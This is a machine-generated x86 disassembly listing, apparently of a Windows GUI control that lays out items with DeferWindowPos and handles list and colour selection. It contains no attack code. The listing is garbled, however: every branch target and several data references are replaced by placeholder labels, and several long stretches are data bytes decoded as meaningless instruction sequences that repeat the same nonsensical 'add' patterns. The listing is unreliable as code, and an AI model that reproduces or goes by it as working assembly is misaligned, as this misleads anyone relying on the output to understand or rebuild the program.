mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_4237fc
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42f99d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_44f2dc
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_448a14
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_4484f8
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_418310
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
sub_42f9ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41836c
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_448700
mov eax ebx
mov si 0xffeb
call sub_40348c
sub_42f9e4
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42fb5c
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42fa58
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f57c
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_4183f8
call sub_403290
pop edi
pop esi
pop ebx
retn
sub_42fa98
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42f814
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42fad0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_418310
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418310
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42fb5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42fc25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42fa58
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42f814
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc2c
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_418310
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418310
pop edx
call sub_448b24
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42fc34
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44e7c8
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418310
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42fcbf
add [ 0x640000ff ] ah
jbe r-xdata
inc edi
add [ esi ] ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
jbe r-xdata
inc edi
add [ 0x640000ff ] dl
jbe r-xdata
inc edi
add [ 0x640000ff ] ch
jbe r-xdata
inc edi
add [ 0x640000ff ] al
jbe r-xdata
add [ edi ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
jbe r-xdata
inc edi
add [ esi ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ 0x640000ff ] bl
jbe r-xdata
add [ edi ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
jbe r-xdata
inc edi
add [ edi ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
jbe r-xdata
add [ esi ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040a0
push 0x2e
mov ecx rw-data
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417c34
test al al
jne r-xdata
add [ edi ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_42ff45
inc edi
add [ esi ] al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
push [ fs : eax ]
rcl [ ebp + 0x68 ] 0x45
inc [ edx ]
add [ 0x640000ff ] cl
jbe r-xdata
add [ edi ] al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
jbe r-xdata
inc edi
add [ esi ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
mov eax [ edi + 0x23c ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff4c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax ebx
call sub_404528
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov [ fs : eax ] esp
mov eax ebx
call sub_4232f0
mov [ ebp - 0x4 ] eax
test [ edi + 0x298 ] 0x40
je r-xdata
push [ eax ]
add [ esi ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
mov esi 0x1
mov esi 0x3
jmp r-xdata
inc eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_404008
mov eax ebx
call sub_4042c8
sub eax esi
jl r-xdata
lea eax [ ebp - 0x14 ]
mov dl [ ebx + esi - 0x1 ]
call sub_4041f0
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_4042d0
inc esi
dec [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebx + esi - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042d0
sub_42ff63
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43ee88
mov dl 0x3
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x118 ]
mov al [ r-xdata ]
mov [ esi + 0x298 ] al
xor eax eax
mov [ esi + 0x2a4 ] eax
xor eax eax
mov [ esi + 0x29c ] eax
xor eax eax
mov [ esi + 0x2a0 ] eax
mov eax esi
call sub_4303ec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42fff8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xc0
ja r-xdata
xor eax eax
pop ecx
pop ebp
retn
cmp [ ebp - 0x3 ] 0xc0
ja r-xdata
cmp [ ebp - 0x2 ] 0xc0
jbe r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x8 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax 0xffffff
jmp r-xdata
pop ecx
pop ebp
retn
sub_43002c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43019a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x208 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4243a0
mov eax [ ebx + 0x14 ]
call sub_423fac
mov edi eax
push esi
push edi
lea esi [ ebp - 0x14 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call InflateRect
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4301ac
mov edx eax
mov eax [ ebx + 0x14 ]
call sub_423fb4
mov eax [ ebx + 0x14 ]
call sub_423fac
cmp eax 0x20000000
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_423fac
cmp eax 0x1fffffff
jne r-xdata
mov edx [ esi + 0x29c ]
mov eax [ ebx + 0x14 ]
call sub_423fb4
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4243a0
push ebp
mov eax [ ebx + 0x14 ]
call sub_423fac
call sub_4232e0
call sub_42fff8
pop ecx
mov edx eax
mov eax [ ebx + 0x14 ]
call sub_423fb4
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4243dc
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_423fb4
mov eax [ ebp - 0x1c ]
add eax 0x5
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_424730
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov edx [ esi + 0x2a0 ]
mov eax [ ebx + 0x14 ]
call sub_423fb4
add edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_424630
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4301a1
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40402c
retn
adc edx 0x0
sub_4301c4
push ebx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x2a4 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax 0xff000000
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_4301ac
jmp r-xdata
pop ebx
retn
sub_43021c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f2e8
test [ ebx + 0x298 ] 0x20
je r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x11c ]
test al al
je r-xdata
mov [ esi ] 0x0
cmp [ ebx + 0x222 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_430290
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43036c
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cc64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43034f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x23c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4232e0
mov esi eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x58 ] esi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax r-xdata
call sub_408d00
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430356
mov eax [ ebp - 0x8 ]
call sub_403290
retn
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x58 ]
mov eax [ ebx + 0x23c ]
xor edx edx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_430390
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
sub ebx esi
jg r-xdata
pop esi
pop ebx
pop ebp
retn
dec ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
dec esi
inc ebx
jne r-xdata
sub_4303bc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x23c ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x5c ]
cmp eax 0xffffffff
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x23c ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4303ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4305a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x299 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4305a9
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419538
xor eax eax
push ebp
push sub_43057b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x2a4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
push eax
push r-xdata
call sub_423314
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x10
jne r-xdata
push ebp
mov eax 0x1fffffff
call sub_4303bc
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x4
jne r-xdata
push ebp
mov eax 0x20000000
call sub_4303bc
pop ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x2
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
mov eax 0x14
call sub_430390
pop ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x1
jne r-xdata
push ebp
mov edx 0x13
mov eax 0x10
call sub_430390
pop ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x20
je r-xdata
push ebp
mov edx 0xf
xor eax eax
call sub_430390
pop ecx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43061c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4195f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x299 ] 0x0
retn
push esi
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x64 ]
sub_4305b0
push ebx
mov ebx eax
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov eax ebx
call sub_43ec14
mov [ ebx + 0x29a ] 0x0
test [ ebx + 0x298 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x11c ]
test al al
je r-xdata
pop ebx
retn
sub_43061c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov [ ebx + 0x2a4 ] esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
test [ ebx + 0x298 ] 0x20
je r-xdata
test [ ebx + 0x298 ] 0x20
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
test edi edi
jne r-xdata
cmp esi 0xff000000
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov ecx esi
xor edx edx
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0x24 ]
xor edi edi
jmp r-xdata
mov [ esp ] eax
mov ebp 0x1
inc ebp
dec [ esp ]
jne r-xdata
mov edi ebp
jmp r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax esi
jne r-xdata
sub_4306c4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x298 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x298 ] al
mov al [ ebx + 0x298 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
setne dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_4303ec
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
jne r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_430735
add [ eax ] al
add [ edi ] ch
add [ eax ] al
add ah ah
pop ecx
inc edi
add [ esi + edi * 8 ] ch
inc edx
add ah bl
pop ecx
inc edi
add [ esi + edi * 8 ] ah
inc edx
add ah dl
pop ecx
inc edi
add [ esi + edi * 8 ] bl
inc edx
add ah cl
pop ecx
inc edi
add [ esi + edi * 8 ] dl
inc edx
add ah al
pop ecx
inc edi
add [ esi + edi * 8 ] cl
inc edx
add [ ecx + ebx * 2 - 0x1fbffb9 ] bh
inc edx
add [ ecx + ebx * 2 - 0x203ffb9 ] dh
inc edx
add [ ecx + ebx * 2 - 0x20bffb9 ] ch
inc edx
add [ ecx + ebx * 2 - 0x213ffb9 ] ah
inc edx
add [ ecx + ebx * 2 - 0x21bffb9 ] bl
inc edx
add [ ecx + ebx * 2 - 0x223ffb9 ] dl
inc edx
add [ ecx + ebx * 2 - 0x22bffb9 ] cl
inc edx
add [ ecx + ebx * 2 - 0x233ffb9 ] al
inc edx
add [ ecx + ebx * 2 + 0x47 ] bh
add ah al
std
inc edx
add [ ecx + ebx * 2 + 0x47 ] dh
add [ ebp + edi * 8 + 0x596c0042 ] bh
inc edi
add [ ebp + edi * 8 + 0x59640042 ] dh
inc edi
add [ ebp + edi * 8 + 0x595c0042 ] ch
inc edi
add [ ebp + edi * 8 + 0x59540042 ] ah
inc edi
add [ ebp + edi * 8 + 0x594c0042 ] bl
inc edi
add [ ebp + edi * 8 + 0x59440042 ] dl
inc edi
add [ ebp + edi * 8 + 0x593c0042 ] cl
inc edi
add [ ebp + edi * 8 + 0x59340042 ] al
inc edi
add [ ebp + edi * 8 + 0x42 ] bh
add [ ecx + ebx * 2 ] ch
inc edi
add [ ebp + edi * 8 + 0x42 ] dh
add [ ecx + ebx * 2 ] ah
inc edi
add [ ebp + edi * 8 + 0x42 ] ch
add [ ecx + ebx * 2 ] bl
inc edi
add [ ebp + edi * 8 + 0x42 ] ah
add [ ecx + ebx * 2 ] dl
inc edi
add [ ebp + edi * 8 + 0x42 ] bl
add [ ecx + ebx * 2 ] cl
inc edi
add [ ebp + edi * 8 + 0x42 ] dl
add [ ecx + ebx * 2 ] al
inc edi
add [ ebp + edi * 8 + 0x42 ] cl
add ah bh
pop eax
inc edi
add [ ebp + edi * 8 + 0x42 ] al
add ah dh
pop eax
inc edi
add [ edi * 8 + 0x58ec0042 ] bh
inc edi
add [ edi * 8 + 0x58e40042 ] dh
inc edi
add [ edi * 8 + 0x58dc0042 ] ch
inc edi
add [ edi * 8 + 0x58d40042 ] ah
inc edi
add [ edi * 8 + 0x58cc0042 ] bl
inc edi
add [ edi * 8 + 0x58c40042 ] dl
inc edi
add [ edi * 8 + 0x58bc0042 ] cl
inc edi
add [ edi * 8 + 0x58b40042 ] al
inc edi
add ah bh
cld
inc edx
add [ eax + ebx * 2 - 0x30bffb9 ] ch
inc edx
add [ eax + ebx * 2 - 0x313ffb9 ] ah
inc edx
add [ eax + ebx * 2 - 0x31bffb9 ] bl
inc edx
add [ eax + ebx * 2 - 0x323ffb9 ] dl
inc edx
add [ eax + ebx * 2 - 0x32bffb9 ] cl
inc edx
add [ eax + ebx * 2 - 0x333ffb9 ] al
inc edx
add [ eax + ebx * 2 + 0x47 ] bh
add ah al
cld
inc edx
add [ eax + ebx * 2 + 0x47 ] dh
add [ esp + edi * 8 - 0x74aaffbe ] bh
in al dx
xor eax eax
push ebp
push sub_4308f0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4308f7
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404a84
sub_43092f
add ah dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl bh
inc [ eax ]
